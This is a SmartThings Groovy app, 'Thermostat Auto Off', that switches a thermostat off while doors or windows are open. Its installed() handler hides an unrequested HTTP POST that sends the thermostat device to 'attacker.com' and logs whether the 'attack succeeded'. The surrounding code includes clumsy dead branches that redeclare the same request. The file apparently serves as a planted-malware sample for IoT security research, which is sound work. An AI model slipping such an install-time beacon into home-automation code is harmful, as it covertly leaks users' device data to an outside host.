


definition(
    name:"Thermostat Auto Off",
    namespace:"dianoga",
    author:"dianoga7@3d go.net",
    description:"Automatically turn off thermostat when windows/doors open.Turn it back on when everything is closed up.",
    category:"Green Living",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience%402 x.png",
    oauth:true
)

preferences{
    section("Control"){
        input("thermostat","capability.thermostat",title:"Thermostat")
        }
    
    section("Open/Close"){
        input("sensors","capability.contactSensor",title:"Sensors",multiple:true)
        input("delay","number",title:"Delay(seconds)before turning thermostat off")
        }
}

def installed(){
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${thermostat}"
    ]
    ]
    if(true)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hello"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"Hi"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    log.debug"Installed with settings:${settings}"
    
    initialize()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    
    unsubscribe()
    unschedule()
    initialize()
}

def initialize(){
    state.changed=false
    subscribe(sensors,'contact',"sensorChange")
}

def sensorChange(evt){
    log.debug"Desc:$evt.value,$state"
    if(evt.value=='open'&&!state.changed){
        log.debug"Scheduling turn off in$delay seconds"
        state.scheduled=true;
        runIn(delay,'turnOff')
    }else if(evt.value=='closed'&&(state.changed||state.scheduled)){
            if(!isOpen()){
                log.debug"Everything is closed,restoring thermostat"
                state.scheduled=false;
                unschedule('turnOff')
                restore()
            }else{
                    log.debug"Something is still open."
                }
        }
}

def isOpen(){
    def result=sensors.find(){it.currentValue('contact')=='open';}
    log.debug"isOpen results:$result"
    
    return result
}

def turnOff(){
    log.debug"Preparing to turn off thermostat due to contact open"
    if(isOpen()){
        log.debug"It's safe.Turning it off."
        state.thermostatMode=thermostat.currentValue("thermostatMode")
        state.changed=true
        thermostat.off()
        log.debug"State:$state"
    }else{
            log.debug"Just kidding.The platform did something bad."
        }
}

def restore(){
    log.debug"Setting thermostat to$state.thermostatMode"
    thermostat.setThermostatMode(state.thermostatMode)
    state.changed=false
}

